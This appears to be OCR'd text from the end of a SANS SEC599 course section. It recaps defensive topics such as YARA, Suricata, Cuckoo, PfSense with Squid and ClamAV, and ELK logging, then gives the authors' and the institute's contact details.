That concludes 599.2! Throughout this section, we've touched upon the following topics:
· Main payload delivery strategies & end-user awareness · Introducing YARA for easy malware classification
Leveraging Suricata & Cuckoo for mail security controls · Deploying PfSense using Squid & ClamAV for web security controls · Controlling removable media to stop delivery · Log centralization & visualization using ELK
Controlling scripts in the enterprise
In the next section of the course (SEC599.3), we will continue investigating techniques to stop exploitation, once the payload has been delivered...
Conclusions for 599.2 That concludes 599.2! Throughout this section, we've touched upon the following topics:
· Main payload delivery strategies & end-user awareness · Introducing YARA for easy malware classification · Leveraging Suricata & Cuckoo for mail security controls · Deploying PfSense using Squid & ClamAV for web security controls · Controlling removable media to stop delivery · Log centralization & visualization using ELK · Controlling scripts in the enterprise
The controls we introduced should put us in a good position to block or detect an incoming payload being delivered against our environment. ln the next section ofthe course (SEC599.3), we will continue investigating techniques to stop exploitation, in case the payload is delivered anyhow...

190

© 2017 Erik Van Buggenhout & Stephen Sims

Course Resources and Contact Information
AUTHOR CONTACT
ErikVan Buggenhout evanbug g e n h o u t @ nv iso.be Stephen Sims ssims@sans.org

CYBER DEFENSE CONTACT

0

Stephen Sims ssims@sans.org

SAN~
This page intentionally left blank.

SANS INSTITUTE
8120 Woodmont Ave.. Suite 310 Bethesda, M D 208 14 301 .654.SANS (7267)
SANS EMAIL
GENERAL INQUIRIES: info@sans.org REGISTRATION: registration@sans.org TUITION: tuition@sans.org PRESS/PR: press@sans.org

© 2017 Erik Van Buggenhout & Stephen Sims

191

